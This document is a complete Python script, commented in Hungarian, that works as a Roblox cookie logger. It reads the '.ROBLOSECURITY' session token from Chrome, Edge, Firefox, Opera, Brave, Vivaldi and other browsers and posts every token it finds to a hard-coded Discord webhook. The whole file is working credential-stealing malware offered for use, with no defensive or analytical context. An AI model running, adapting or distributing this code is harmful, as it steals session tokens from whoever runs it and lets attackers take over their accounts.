import browser_cookie3 as bc
from threading import Thread
import requests
import os

# --- A TE WEBHOOKOD BELEÍRVA ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1490406465620676761/eP0WSDcEzdoNKA2cwCBb2kE25N8COm8gneXHYLwUlekglgdv1NWa-qW6dIJuGsgRL0JL"

class CookieHunter:
    def __init__(self, webhook):
        self.webhook = webhook

    def extract_and_send(self, browser_func, name):
        try:
            # Megpróbáljuk kinyerni a sütiket az adott böngészőből
            cookies = browser_func(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    token = cookie.value
                    
                    # Discord üzenet küldése (Embed formátum)
                    requests.post(self.webhook, json={
                        "username": "Ghost Hunter",
                        "embeds": [{
                            "title": f"🎯 Találat: {name}",
                            "description": f"```fix\n{token}```",
                            "color": 0x00ff00,
                            "footer": {"text": "Roblox Cookie Logger | 2026"}
                        }]
                    })
                    return True
        except Exception:
            pass
        return False

    def run_all(self):
        # Az összes támogatott böngésző listája
        targets = [
            (bc.chrome, "Chrome"),
            (bc.edge, "Edge"),
            (bc.firefox, "Firefox"),
            (bc.opera, "Opera"),
            (bc.opera_gx, "Opera GX"),
            (bc.brave, "Brave"),
            (bc.vivaldi, "Vivaldi"),
            (bc.chromium, "Chromium")
        ]
        
        threads = []
        for func, name in targets:
            # Szálindítás, hogy ne akadjon meg a program
            t = Thread(target=self.extract_and_send, args=(func, name))
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()

if __name__ == "__main__":
    # Program indítása
    print("Keresés folyamatban...")
    hunter = CookieHunter(WEBHOOK_URL)
    hunter.run_all()
    print("Keresés befejezve. Ellenőrizd a Discordot!")
